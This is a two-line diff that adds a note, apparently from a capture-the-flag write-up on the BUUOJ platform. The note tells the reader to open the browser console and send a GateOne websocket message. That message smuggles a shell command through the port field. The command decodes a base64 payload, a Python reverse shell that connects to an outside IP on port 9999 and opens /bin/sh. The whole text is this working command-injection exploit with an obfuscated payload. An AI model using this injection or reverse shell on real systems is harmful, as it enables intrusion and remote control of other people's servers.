@@ -1,0 +1,2 @@
+按F12，控制台里输入如下代码
+GateOne.ws.send('{"terminal:ssh_get_host_fingerprint":{"host":"node1.buuoj.cn","port":"28030;echo cHl0aG9uIC1jICdpbXBvcnQgc29ja2V0LHN1YnByb2Nlc3Msb3M7cz1zb2NrZXQuc29ja2V0KHNvY2tldC5BRl9JTkVULHNvY2tldC5TT0NLX1NUUkVBTSk7cy5jb25uZWN0KCgiMTYxLjEyOS40My4xMDUiLDk5OTkpKTtvcy5kdXAyKHMuZmlsZW5vKCksMCk7IG9zLmR1cDIocy5maWxlbm8oKSwxKTsgb3MuZHVwMihzLmZpbGVubygpLDIpO3A9c3VicHJvY2Vzcy5jYWxsKFsiL2Jpbi9zaCIsIi1pIl0pOyc= | base64 -d| sh;"}}')
